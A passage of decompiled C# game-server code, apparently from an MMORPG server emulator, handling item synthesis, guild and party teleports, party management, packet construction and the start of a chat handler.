								if (!合成物品表.ContainsKey(1))
								{
									ItmeClass value3;
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else if (装备栏包裹[num2].FLD_强化数量 != 0)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value3))
									{
										if (value3.FLD_RESIDE2 != 7 && value3.FLD_RESIDE2 != 8 && value3.FLD_RESIDE2 != 10)
										{
											合成提示(num, 2, 0, 装备栏包裹[num2]);
										}
										else
										{
											BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0);
											if (value3.ItmeNAME.Contains("梅柳真"))
											{
												ItmeClass itme = ItmeClass.GetItme(value3.ItmeNAME.Replace("（梅柳真）", ""));
												ItmeClass itme2 = ItmeClass.GetItme(value3.ItmeNAME.Replace("-魔（梅柳真）", ""));
												if (itme != null)
												{
													fLD_PID = itme.FLD_PID;
													goto IL_12823;
												}
												if (itme2 != null)
												{
													fLD_PID = itme2.FLD_PID;
													goto IL_12823;
												}
											}
											else
											{
												ItmeClass itme3 = ItmeClass.GetItme(value3.ItmeNAME + "（梅柳真）");
												ItmeClass itme4 = ItmeClass.GetItme(value3.ItmeNAME + "-魔（梅柳真）");
												if (itme3 != null)
												{
													fLD_PID = itme3.FLD_PID;
													goto IL_12823;
												}
												if (itme4 != null)
												{
													fLD_PID = itme4.FLD_PID;
													goto IL_12823;
												}
											}
										}
									}
								}
								goto end_IL_12664;
								IL_12823:
								HcItimesClass hcItimesClass3 = new HcItimesClass();
								hcItimesClass3.位置 = num2;
								hcItimesClass3.物品 = 装备栏包裹[num2].物品_byte;
								装备栏包裹[num2].锁定 = true;
								合成物品表.Add(1, hcItimesClass3);
								炼金合成提示(num, 1, 0, 装备栏包裹[num2], fLD_PID);
								end_IL_12664:;
							}
							catch (Exception ex3)
							{
								string[] obj2 = new string[6]
								{
									"211披风分解 出错",
									base.Client.WorldId.ToString(),
									"|",
									base.Client.ToString(),
									" ",
									null
								};
								obj2[5] = ((ex3 != null) ? ex3.ToString() : null);
								Form1.WriteLine(1, string.Concat(obj2));
							}
							break;
						default:
							if (num != 0)
							{
								System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
								if (base.Client != null)
								{
									base.Client.Send(array, array.Length);
								}
							}
							break;
						case 371:
							try
							{
								if (!合成物品表.ContainsKey(1))
								{
									ItmeClass value2;
									if (装备栏包裹[num2].物品绑定)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value2))
									{
										if (value2.FLD_RESIDE2 != 16)
										{
											合成提示(num, 2, 0, 装备栏包裹[num2]);
										}
										else
										{
											int num7 = BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0);
											if ((uint)(num7 - 1000001170) <= 5u)
											{
												int num8 = num7 + 6;
												if ((uint)(num8 - 1000001176) <= 5u)
												{
													HcItimesClass hcItimesClass2 = new HcItimesClass();
													hcItimesClass2.位置 = num2;
													hcItimesClass2.物品 = 装备栏包裹[num2].物品_byte;
													装备栏包裹[num2].锁定 = true;
													合成物品表.Add(1, hcItimesClass2);
													合成提示(num, 1, 0, 装备栏包裹[num2]);
													炼金合成提示(num, 1, 0, 装备栏包裹[num2], num8);
												}
											}
										}
									}
								}
							}
							catch (Exception ex2)
							{
								string[] obj = new string[6]
								{
									"211披风分解 出错",
									base.Client.WorldId.ToString(),
									"|",
									base.Client.ToString(),
									" ",
									null
								};
								obj[5] = ((ex2 != null) ? ex2.ToString() : null);
								Form1.WriteLine(1, string.Concat(obj));
							}
							break;
						case 370:
							{
								try
								{
									if (合成物品表.Count < 1)
									{
										合成提示(num, 2, 0, 装备栏包裹[num2]);
									}
									else if (装备栏包裹[num3].Get物品ID == 1008001963L || 装备栏包裹[num3].Get物品ID == 1008001964L)
									{
										HcItimesClass hcItimesClass = null;
										if (合成物品表.ContainsKey(1))
										{
											hcItimesClass = 合成物品表[1];
										}
										int 位置 = hcItimesClass.位置;
										int num5 = BitConverter.ToInt32(装备栏包裹[位置].物品ID, 0);
										ItmeClass value;
										if (World.Itme.TryGetValue(num5, out value) && value.FLD_RESIDE2 == 16 && (num5 == 1000001170 || num5 == 1000001171 || num5 == 1000001172 || num5 == 1000001173 || num5 == 1000001174 || num5 == 1000001175))
										{
											int num6 = num5 + 6;
											if ((uint)(num6 - 1000001176) <= 5u)
											{
												int fLD_MAGIC = 装备栏包裹[hcItimesClass.位置].FLD_MAGIC0;
												int fLD_MAGIC2 = 装备栏包裹[hcItimesClass.位置].FLD_MAGIC1;
												int fLD_MAGIC3 = 装备栏包裹[hcItimesClass.位置].FLD_MAGIC2;
												int fLD_MAGIC4 = 装备栏包裹[hcItimesClass.位置].FLD_MAGIC3;
												int fLD_MAGIC5 = 装备栏包裹[hcItimesClass.位置].FLD_MAGIC4;
												减去物品(num3, 1);
												减去物品(位置, 1);
												int 绑定 = 0;
												if (装备栏包裹[hcItimesClass.位置].物品绑定)
												{
													绑定 = 1;
												}
												增加物品带属性(num6, 位置, 1, fLD_MAGIC, fLD_MAGIC2, fLD_MAGIC3, fLD_MAGIC4, fLD_MAGIC5, 0, 0, 0, 绑定, 0);
												合成物品表.Clear();
												合成系统解锁();
												打开仓库中 = false;
												元宝合成开关 = 0;
												合成提示(num, 1, 0, 装备栏包裹[hcItimesClass.位置]);
											}
										}
									}
								}
								catch (Exception ex)
								{
									Form1.WriteLine(1, "组合错误![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
								}
								break;
							}
							IL_bede:
							装备栏包裹[hcItimesClass32.位置].锁定 = false;
							合成物品表.Clear();
							合成系统解锁();
							元宝合成开关 = 0;
							合成手续费 = 0;
							goto default;
							IL_d766:
							hcItimesClass69 = new HcItimesClass();
							hcItimesClass69.位置 = num2;
							hcItimesClass69.物品 = 装备栏包裹[num2].物品_byte;
							装备栏包裹[num2].锁定 = true;
							if (!合成物品表.ContainsKey(3))
							{
								合成物品表.Add(3, hcItimesClass69);
							}
							合成提示(num, 1, 0, 装备栏包裹[num2]);
							goto default;
						}
					}
				}
				catch (Exception ex105)
				{
					元宝合成开关 = 0;
					Form1.WriteLine(1, "合成系统出错![" + base.Userid + "]-[" + base.UserName + "][" + num + "]" + ex105.Message);
				}
			}
		}

		public void 帮派传送(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num;
				Players players;
				if (base.帮派Id != 0 && base.人物坐标_地图 != 801 && base.人物坐标_地图 != 2501)
				{
					if (World.当前是否是银币线路 == 1)
					{
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
					}
					else
					{
						byte[] array = new byte[2];
						System.Buffer.BlockCopy(封包数据, 14, array, 0, 2);
						num = Buffer.ToInt16(array, 0);
						if (Buffer.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000122)
						{
							byte[] array2 = new byte[14];
							System.Buffer.BlockCopy(封包数据, 26, array2, 0, 14);
							string string_ = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
							if (Buffer.ToInt32(装备栏包裹[num].物品ID, 0) != 0)
							{
								players = World.检查玩家name(string_);
								if (players != null)
								{
									string[] array3 = World.地图锁定.Split(';');
									if (array3.Length >= 1)
									{
										for (int i = 0; i < array3.Length; i++)
										{
											if (int.Parse(array3[i]) == players.人物坐标_地图)
											{
												帮派传送符提示(8, num, 1008000122);
												return;
											}
										}
									}
									if (players.人物坐标_地图 != 42101 && players.人物坐标_地图 != 9001 && players.人物坐标_地图 != 9101 && players.人物坐标_地图 != 9201)
									{
										if (players.人物坐标_地图 == 32002)
										{
											if (活动地图剩余时间 > 0)
											{
												FBtime = DateTime.Now;
												系统提示("开始计时,[" + 活动地图剩余时间 + "]分钟后自动传送到泫勃派。");
												goto IL_026f;
											}
											帮派传送符提示(8, num, 1008000122);
											系统提示("移动失败,活动地图剩余时间为零。");
										}
										else
										{
											if (players.人物坐标_地图 != 30000 && players.人物坐标_地图 != 30100 && players.人物坐标_地图 != 30200 && players.人物坐标_地图 != 30300)
											{
												goto IL_026f;
											}
											if (修炼地图剩余时间 > 0)
											{
												FBtime = DateTime.Now;
												系统提示("开始计时,[" + 修炼地图剩余时间 + "]分钟后自动传送到泫勃派。");
												goto IL_026f;
											}
											帮派传送符提示(8, num, 1008000122);
											系统提示("移动失败,修炼地图剩余时间为零。");
										}
									}
									else
									{
										系统提示("此处不允许使用。");
									}
								}
								else
								{
									帮派传送符提示(2, num, 1008000122);
								}
							}
						}
					}
				}
				goto end_IL_0000;
				IL_026f:
				if (players.UserName == base.UserName)
				{
					帮派传送符提示(3, num, 1008000122);
				}
				else if (players.帮派Id != base.帮派Id)
				{
					帮派传送符提示(6, num, 1008000122);
				}
				else
				{
					帮派传送符提示(1, num, 1008000122);
					物品减去属性数量(num, 1);
					移动(players.人物坐标_X, players.人物坐标_Y, players.人物坐标_Z, players.人物坐标_地图);
				}
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "帮派传送出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 组队传送(byte[] 封包数据, int length)
		{
			try
			{
				int 人物坐标_地图;
				int num;
				Players players;
				if (World.当前是否是银币线路 == 1)
				{
					系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
				}
				else
				{
					人物坐标_地图 = base.人物坐标_地图;
					byte[] array = new byte[2];
					System.Buffer.BlockCopy(封包数据, 14, array, 0, 2);
					byte[] array2 = new byte[14];
					System.Buffer.BlockCopy(封包数据, 26, array2, 0, 14);
					string string_ = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
					num = Buffer.ToInt16(array, 0);
					if (Buffer.ToInt32(装备栏包裹[num].物品ID, 0) == 1008000120 && Buffer.ToInt32(装备栏包裹[num].物品ID, 0) != 0)
					{
						players = World.检查玩家name(string_);
						if (players != null)
						{
							string[] array3 = World.地图锁定.Split(';');
							if (array3.Length >= 1)
							{
								for (int i = 0; i < array3.Length; i++)
								{
									if (int.Parse(array3[i]) == players.人物坐标_地图)
									{
										组队传送符提示(8, num, 1008000120);
										return;
									}
								}
							}
							if (players.人物坐标_地图 == 25100 && base.Player_Level < 10)
							{
								系统提示("等级达到10级才能进入此地图。");
							}
							else if (players.人物坐标_地图 == 32002)
							{
								if (活动地图剩余时间 > 0)
								{
									FBtime = DateTime.Now;
									系统提示("开始计时,[" + 活动地图剩余时间 + "]分钟后自动传送到泫勃派。");
									goto IL_022d;
								}
								组队传送符提示(8, num, 1008000120);
								系统提示("移动失败,活动地图剩余时间为零。");
							}
							else
							{
								if (players.人物坐标_地图 != 30000 && players.人物坐标_地图 != 30100 && players.人物坐标_地图 != 30200 && players.人物坐标_地图 != 30300)
								{
									goto IL_022d;
								}
								if (修炼地图剩余时间 > 0)
								{
									FBtime = DateTime.Now;
									系统提示("开始计时,[" + 修炼地图剩余时间 + "]分钟后自动传送到泫勃派。");
									goto IL_022d;
								}
								组队传送符提示(8, num, 1008000120);
								系统提示("移动失败,修炼地图剩余时间为零。");
							}
						}
						else
						{
							组队传送符提示(2, num, 1008000120);
						}
					}
				}
				goto end_IL_0000;
				IL_022d:
				if (players.UserName == base.UserName)
				{
					组队传送符提示(3, num, 1008000120);
				}
				else if (players.组队id != 组队id)
				{
					组队传送符提示(6, num, 1008000120);
				}
				else
				{
					移动(players.人物坐标_X, players.人物坐标_Y, players.人物坐标_Z, players.人物坐标_地图);
					if (人物坐标_地图 == base.人物坐标_地图)
					{
						组队传送符提示(7, num, 1008000120);
					}
					else
					{
						组队传送符提示(1, num, 1008000120);
						物品减去属性数量(num, 1);
					}
				}
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "组队传送出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 退出组队(byte[] data, int length)
		{
			组队Class value;
			if (World.W组队.TryGetValue(组队id, out value))
			{
				value.退出(this, 0);
			}
		}

		public void 队长管理(byte[] data, int length)
		{
			try
			{
				byte[] array = new byte[14];
				System.Buffer.BlockCopy(data, 14, array, 0, 14);
				string string_ = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
				byte[] array2 = new byte[4];
				System.Buffer.BlockCopy(data, 10, array2, 0, 1);
				int num = BitConverter.ToInt32(array2, 0);
				int int_ = BitConverter.ToInt16(data, 12);
				switch (num)
				{
				case 2:
				{
					组队Class value2;
					if (World.W组队.TryGetValue(组队id, out value2))
					{
						Players players3 = 得到人物数据(int_);
						if (players3 != null)
						{
							value2.退出(players3, 2);
						}
						else
						{
							Players players4 = 得到人物数据(string_);
							if (players4 != null)
							{
								value2.委任队长(this, players4);
							}
						}
					}
					break;
				}
				case 1:
				{
					组队Class value;
					if (World.W组队.TryGetValue(组队id, out value))
					{
						Players players = 得到人物数据(int_);
						if (players != null)
						{
							value.委任队长(this, players);
						}
						else
						{
							Players players2 = 得到人物数据(string_);
							if (players2 != null)
							{
								value.委任队长(this, players2);
							}
						}
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "队长管理出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 显示队员()
		{
			try
			{
				if (World.jlMsg == 1)
				{
					Form1.WriteLine(0, "Players_显示队员");
				}
				组队Class value;
				if (World.W组队.TryGetValue(组队id, out value))
				{
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write(1);
						发包类.Write(100);
						发包类.Write(0);
						发包类.Write(value.队员列表.Count);
						发包类.Write(1);
						发包类.Write(0);
						foreach (Players value2 in value.队员列表.Values)
						{
							if (value2.UserName == value.队长Name)
							{
								发包类.Write2(value2.人物全服ID);
								发包类.Write2(value2.人物_HP);
								发包类.Write2(value2.人物_MP);
								发包类.Write2(value2.人物最大_HP);
								发包类.Write2(value2.人物最大_MP);
								发包类.WriteString(value2.UserName, 14);
								发包类.Write2(0);
								发包类.Write(1);
								发包类.Write(0);
								发包类.Write(value2.Player_Job);
								发包类.Write(0);
								发包类.Write4(0);
							}
						}
						foreach (Players value3 in value.队员列表.Values)
						{
							if (value3.UserName != value.队长Name)
							{
								发包类.Write2(0);
								发包类.Write2(value3.人物全服ID);
								发包类.Write2(value3.人物_HP);
								发包类.Write2(value3.人物_MP);
								发包类.Write2(value3.人物最大_HP);
								发包类.Write2(value3.人物最大_MP);
								发包类.WriteString(value3.UserName, 14);
								发包类.Write2(0);
								发包类.Write(1);
								发包类.Write(0);
								发包类.Write(value3.Player_Job);
								发包类.Write(0);
								发包类.Write4(0);
							}
						}
						for (int i = 0; i < value.队员列表.Count; i++)
						{
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 30720, base.人物全服ID);
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "显示队员()错误[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 委任队长提示(Players Playe, Players ToPlaye)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA553200000029002400010001000000C8CE0000000000000000000000000100D1E0D00000000000000000000000000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 14, 2);
				byte[] bytes = Encoding.Default.GetBytes(Playe.UserName);
				System.Buffer.BlockCopy(bytes, 0, array, 16, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(ToPlaye.人物全服ID), 0, array, 30, 2);
				byte[] bytes2 = Encoding.Default.GetBytes(ToPlaye.UserName);
				System.Buffer.BlockCopy(bytes2, 0, array, 32, bytes2.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "委任队长提示出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 解散组队提示()
		{
			byte[] array = Converter.hexStringToByte("AA55120000003700040003000200000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 本人退出组队提示()
		{
			byte[] array = Converter.hexStringToByte("AA5510000000370002000500000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 退出组队提示(Players Playe)
		{
			byte[] array = Converter.hexStringToByte("AA5525000A0037001700020001000B000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 14, 2);
			byte[] bytes = Encoding.Default.GetBytes(Playe.UserName);
			System.Buffer.BlockCopy(bytes, 0, array, 17, bytes.Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 加入组队提示(Players Playe)
		{
			byte[] array = Converter.hexStringToByte("AA5525000100350017000100010002000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 14, 2);
			byte[] bytes = Encoding.Default.GetBytes(Playe.UserName);
			System.Buffer.BlockCopy(bytes, 0, array, 17, bytes.Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 本人取消组队(byte[] data, int length)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA5512000B003300040001000100000000000000000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				组队Class value;
				if (World.W组队.TryGetValue(组队id, out value))
				{
					if (value.邀请人 != null)
					{
						value.邀请人.组队id = 0;
						value.邀请人.组队阶段 = 0;
						if (value.邀请人.Client != null)
						{
							value.邀请人.Client.Send(array, array.Length);
						}
						value.邀请人 = null;
					}
					if (value.队员列表.Count <= 1)
					{
						value.Dispose();
						World.W组队.Remove(组队id);
						组队id = 0;
						组队阶段 = 0;
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "本人取消组队出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 对方取消组队(byte[] data, int length)
		{
			int num = 0;
			try
			{
				byte[] array = new byte[4];
				System.Buffer.BlockCopy(data, 14, array, 0, 2);
				int num2 = BitConverter.ToInt32(array, 0);
				byte[] array2 = new byte[4];
				System.Buffer.BlockCopy(data, 12, array2, 0, 1);
				int num3 = BitConverter.ToInt32(array2, 0);
				组队Class value;
				if ((得到人物数据(num2) == null || num2 == 2) && World.W组队.TryGetValue(组队id, out value))
				{
					num2 = value.邀请人.人物全服ID;
					num3 = 1;
				}
				switch (num3)
				{
				case 2:
				{
					num = 7;
					byte[] array3 = Converter.hexStringToByte("AA5512000B003300040001000100000000000000000055AA");
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
					num = 8;
					组队阶段 = 0;
					组队Class value4;
					if (World.W组队.TryGetValue(组队id, out value4))
					{
						num = 9;
						Players players2 = 得到人物数据(num2);
						if (players2 != null)
						{
							num = 10;
							if (value4.队长.Client != null)
							{
								System.Buffer.BlockCopy(BitConverter.GetBytes(value4.队长.人物全服ID), 0, array3, 4, 2);
								value4.队长.Client.Send(array3, array3.Length);
							}
							value4.邀请人 = null;
							num = 11;
							if (value4.队员列表.Count <= 1)
							{
								num = 12;
								value4.队长.组队id = 0;
								value4.队长.组队阶段 = 0;
								value4.Dispose();
								num = 13;
								World.W组队.Remove(组队id);
								num = 14;
								players2.组队id = 0;
								组队id = 0;
								players2.组队阶段 = 0;
								组队阶段 = 0;
							}
							else
							{
								组队阶段 = 0;
								组队id = 0;
							}
						}
						if (组队阶段 == 2)
						{
							value4.退出(this, 3);
						}
					}
					break;
				}
				case 1:
				{
					组队Class value2;
					if (World.W组队.TryGetValue(组队id, out value2))
					{
						num = 1;
						value2.邀请人 = null;
						Players players = 得到人物数据(num2);
						if (players != null)
						{
							if (value2.队员列表.Count < 8)
							{
								num = 2;
								Players value3;
								if (!value2.队员列表.TryGetValue(base.人物全服ID, out value3))
								{
									num = 4;
									value2.队员列表.Add(base.人物全服ID, this);
									num = 5;
									value2.加入队员提示(this);
									num = 6;
									组队阶段 = 2;
									players.组队阶段 = 2;
								}
								else if (组队阶段 == 2)
								{
									value2.退出(this, 3);
								}
							}
							else
							{
								players.组队阶段 = 0;
								players.组队id = 0;
								系统提示("队员已满,一个队伍最多可容纳8个人。");
							}
						}
					}
					break;
				}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "对方取消组队出错![" + base.Userid + "]-[" + base.UserName + "]" + num + "|" + ex.Message);
			}
		}

		public void 发送组队数据(string 邀请人, int 成败, int 提示, int 分配方式, int 标记)
		{
			byte[] array = Converter.hexStringToByte("AA551E0013013100180001000100010000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(成败), 0, array, 10, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(提示), 0, array, 12, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(分配方式), 0, array, 14, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 16, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(标记), 0, array, 18, 2);
			byte[] bytes = Encoding.Default.GetBytes(邀请人);
			System.Buffer.BlockCopy(bytes, 0, array, 20, bytes.Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 发送组队(byte[] data, int length)
		{
			int num = 0;
			try
			{
				封包修改(data, length);
				num = 1;
				byte[] array = new byte[4];
				System.Buffer.BlockCopy(data, 14, array, 0, 2);
				num = 2;
				int int_ = BitConverter.ToInt32(array, 0);
				Players players;
				组队Class value;
				if (base.人物PK模式 != 0)
				{
					发送组队数据(base.UserName, 2, 12, 0, 1);
					系统提示("发送邀请组队失败  Code=001");
				}
				else if (!base.Player死亡 && base.人物_HP > 0)
				{
					if (退出中)
					{
						发送组队数据(base.UserName, 2, 2, 0, 1);
						系统提示("发送邀请组队失败  Code=003");
					}
					else if (进店中)
					{
						发送组队数据(base.UserName, 2, 13, 0, 1);
						系统提示("发送邀请组队失败  Code=004");
					}
					else if (打开仓库中)
					{
						发送组队数据(base.UserName, 2, 13, 0, 1);
						系统提示("发送邀请组队失败  Code=005");
					}
					else
					{
						players = 得到人物数据(int_);
						if (players != null)
						{
							if (!查找范围玩家(1000, players))
							{
								发送组队数据(base.UserName, 2, 4, 0, 1);
								系统提示("发送邀请组队失败  Code=006");
							}
							else if (players.组队id != 0)
							{
								系统提示("发送邀请组队失败  Code=007");
							}
							else if (!players.Player死亡 && players.人物_HP > 0)
							{
								if (players.退出中)
								{
									发送组队数据(base.UserName, 2, 2, 0, 1);
									系统提示("发送邀请组队失败  Code=009");
								}
								else if (players.进店中)
								{
									发送组队数据(base.UserName, 2, 13, 0, 1);
									系统提示("发送邀请组队失败  Code=010");
								}
								else if (players.打开仓库中)
								{
									发送组队数据(base.UserName, 2, 13, 0, 1);
									系统提示("发送邀请组队失败  Code=011");
								}
								else if (players.个人商店 != null && players.个人商店.个人商店是否开启)
								{
									发送组队数据(base.UserName, 2, 13, 0, 1);
									系统提示("发送邀请组队失败  Code=012");
								}
								else if (players.UserName == base.UserName)
								{
									发送组队数据(base.UserName, 2, 13, 0, 1);
									系统提示("发送邀请组队失败  Code=013");
								}
								else if (players.Config.组队 == 0)
								{
									发送组队数据(base.UserName, 2, 13, 0, 1);
									系统提示("对方设置不容许组队。");
								}
								else if (组队id == 0 && Math.Abs(base.Player_Level - players.Player_Level) > World.组队等级限制)
								{
									发送组队数据(base.UserName, 2, 6, 0, 1);
									系统提示("等级相差" + World.组队等级限制 + "级以上不能组队。");
								}
								else
								{
									if (!World.W组队.TryGetValue(组队id, out value))
									{
										value = new 组队Class(this);
										value.邀请人 = players;
										组队id = World.Add组队(value);
										players.组队id = 组队id;
										value.组队id = 组队id;
										players.组队阶段 = 1;
										组队阶段 = 1;
										num = 14;
										goto IL_03e4;
									}
									if (value.队长.人物全服ID != base.人物全服ID)
									{
										发送组队数据(base.UserName, 2, 5, 0, 1);
										系统提示("发送邀请组队失败  Code=014");
									}
									else if (Math.Abs(value.队伍级别 - players.Player_Level) > World.组队等级限制)
									{
										发送组队数据(base.UserName, 2, 6, 0, 1);
										系统提示("当前队伍级别为" + value.队伍级别 + "级。", 50, "系统提示");
									}
									else if (value.队员列表.Count < 8 && value.队员列表.Count != 1)
									{
										value.邀请人 = players;
										players.组队id = 组队id;
										players.组队阶段 = 1;
										num = 13;
										goto IL_03e4;
									}
								}
							}
							else
							{
								发送组队数据(base.UserName, 2, 13, 0, 1);
								系统提示("发送邀请组队失败  Code=008");
							}
						}
					}
				}
				else
				{
					发送组队数据(base.UserName, 2, 13, 0, 1);
					系统提示("发送邀请组队失败  Code=002");
				}
				goto end_IL_0002;
				IL_03e4:
				players.发送组队数据(base.UserName, 1, 1, value.道具分配规则, 0);
				发送组队数据(base.UserName, 1, 1, value.道具分配规则, 1);
				end_IL_0002:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "发送组队出错![" + base.Userid + "]-[" + base.UserName + "]" + num + ex.Message);
			}
		}

		public void 狮吼功线程(object ParObject)
		{
			try
			{
				if (base.FLD_RXPIONT >= World.每次狮吼功消耗元宝)
				{
					string str = "高富帅";
					if (base.Player_Sex == 2)
					{
						str = "白富美";
					}
					查百宝阁元宝数();
					检察元宝数据(World.每次狮吼功消耗元宝, 0);
					RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "狮吼功消耗", 1, World.每次狮吼功消耗元宝);
					保存元宝数据();
					foreach (Players value in World.allConnectedChars.Values)
					{
						if (!value.Client.挂机)
						{
							value.系统提示((string)ParObject, 6, str + "[" + base.UserName + "]");
							Thread.Sleep(100);
						}
					}
				}
				else
				{
					系统提示("元宝不够了，每次使用狮吼功扣除" + World.每次狮吼功消耗元宝 + "元宝。");
				}
			}
			catch
			{
			}
		}

		public void 萌犬表情效果(int 物品id, int 开关, int 时间, int 当前时间)
		{
			Convert.ToDouble(DateTime.ParseExact(时间.ToString(), "yyMMddHHmm", CultureInfo.CurrentCulture).AddMinutes(-当前时间).ToString("yyMMddHHmm"));
			byte[] array = Converter.hexStringToByte("AA553900010040022B0027004A010D15038203440101000000C9E3143C20060C0000000001A502BB7135F1B971400FE0F600E02000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(物品id), 0, array, 25, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(开关), 0, array, 33, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(时间), 0, array, 37, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 萌犬表情数据包(int id)
		{
			byte[] array = Converter.hexStringToByte("AA552800010040021A001600AE000830016600A800190100E00D00401700052003E07E00000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(id), 0, array, 30, 1);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 15, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 说话(byte[] 封包数据, int 封包大小)
		{
			if (base.Player_Level < 1)
			{
				系统提示("为防止恶意刷屏,维护游戏秩序.需达到" + 1 + "级以上才能说话,谢谢合作!", 10, "系统提示");
			}
			int num = 0;
			try
			{
				int num2 = 封包数据[39];
				int num3 = 封包数据[10];
				int num4 = 封包数据[34];
				if (num4 > 99)
				{
					num4 = 99;
				}
				byte[] array = new byte[num4];
				num = 1;
				string text;
				try
				{
					System.Buffer.BlockCopy(封包数据, 35, array, 0, array.Length);
					text = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "说话出错1![" + base.Userid + "]-[" + base.UserName + "]" + array.Length + "  " + ex.Message);
					return;
				}
				if (num3 == 25)
				{
					switch (num2)
					{
					case 1:
						萌犬表情数据包(1);
						return;
					case 2:
						萌犬表情数据包(2);
						return;
					case 3:
						萌犬表情数据包(3);
						return;
					case 4:
						萌犬表情数据包(4);
						return;
					case 5:
						萌犬表情数据包(5);
						return;
					case 6:
						萌犬表情数据包(6);
						return;
					case 7:
						萌犬表情数据包(7);
						return;
					case 8:
						萌犬表情数据包(8);
						return;
					case 9:
						萌犬表情数据包(9);
						return;
					case 10:
						萌犬表情数据包(10);
						return;
					}
				}
				num = 2;
				byte[] array2 = new byte[15];
				System.Buffer.BlockCopy(封包数据, 12, array2, 0, array2.Length);
				string name = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
				if (text.Length > 0 && num3 != 100)
				{
					num = 3;
					foreach (KillClass item in World.Kill)
					{
						if (text.Replace("  ", string.Empty).IndexOf(item.Txt) != -1)
						{
